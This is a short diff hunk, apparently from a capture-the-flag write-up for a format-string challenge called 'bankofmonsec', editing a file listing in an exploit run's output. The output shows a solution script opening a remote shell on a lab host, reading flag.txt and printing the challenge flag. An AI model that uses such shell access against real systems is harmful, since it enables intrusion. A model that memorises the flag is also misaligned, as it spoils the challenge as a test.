@@ -175,7 +175,7 @@ $ python2 solution.py
 [+] Opening connection to 192.168.0.14 on port 9000: Done
 [*] Switching to interactive mode
 password: $ ls
-Dockerfile  Makefile  bankofmonsec  bankofmonsec.c  flag.txt  levelup.zip
+Dockerfile  Makefile  bankofmonsec  bankofmonsec.c  flag.txt
 $ cat flag.txt
 FLAG{f0rm47_57r1n65_4r3_u53ful}
 ```
